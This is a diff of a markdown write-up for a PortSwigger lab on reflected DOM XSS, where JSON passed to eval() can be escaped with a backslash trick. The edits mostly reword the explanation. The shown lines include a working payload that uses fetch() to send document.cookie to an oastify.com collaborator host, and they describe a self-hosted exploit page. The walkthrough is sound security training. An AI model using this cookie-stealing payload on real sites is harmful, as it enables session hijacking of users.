@@ -282,24 +282,23 @@ git-cola --repo 0ad900ad039b4591c0a4f91b00a600e7.web-security-academy.net/
 
 ![DOM Invader reflected dom-xss identify](images/dom-invader-reflected-dom-xss-identify.png)  
 
->Testing ```\"-alert(1)}//``` payload we successfully escape the `eval()`. The attacker then deliver an exploit phishing link to the victim with a cookie stealing payload inside a hosted **iframe** on their exploit server.  
-
 >***Identify*** that the search JavaScript `source code` on the target, the string is reflected in a JSON response called search-results.
 From the Site Map, open the `searchResults.js` file and notice that the JSON response is used with an `eval()` function call.
 
 ![Reflected DOM-XSS source-code](images/reflected-dom-xss-source-code.png)  
 
->Validate that the backslash **\\** escape is not sanitized, and the JSON data is then send to `eval()`.  Backslash is not escaped correctly and when the JSON response attempts to escape the opening double-quotes character, it adds a **second** backslash. The resulting double-backslash causes the escaping to be effectively cancelled out.  
+>Testing `\"-alert(1)}//` payload we successfully escape the `eval()`. The attacker then craft an exploit phishing link to the victim with a cookie stealing payload hosted on exploit server.  
+>Above payload validate that the backslash **\\** is not sanitized, and the JSON data is then send to `eval()`.  Backslash is not escaped correctly and when the JSON response attempts to escape the opening double-quotes character, it adds a **second** backslash. The resulting double-backslash causes the escaping to be effectively **cancelled out**.  
 
 ```JavaScript
 \"-fetch('https://xij89yfbz2bycflmxjmfdohokfq6ew2l.oastify.com?reflects='+document.cookie)}//
 ```  
 
->The above payload every character is URL encoded and used as the search parameter value. Then because this lab do not have exploit server i host my own `python3 -m http.server 80` web service and save the `index.html` contain the location target url between `<script>` tags. 
+>The above payload every character is URL encoded and used as the search parameter value. Then because this lab do not have an exploit server I host my own `python3 -m http.server 80` web service and save the `index.html` contain the location target url between `<script>` tags. 
 
 ![Reflected DOM-XSS JSON cookie stealer](images/reflected-dom-xss-json-cookie-stealer.png)  
 
->In image above, I create insecure POC cookie value in my browser before simulating a victim user click on `http://localhost/index.html`, same as Burp Exploit server, Deliver exploit to victim function.  
+>In image above, I create insecure POC cookie value in my browser before simulating a victim user clicking on `http://localhost/index.html` link, same as Burp Exploit server, Deliver exploit to victim function.  
 
 [PortSwigger Lab: Reflected DOM XSS](https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-dom-xss-reflected)  
 
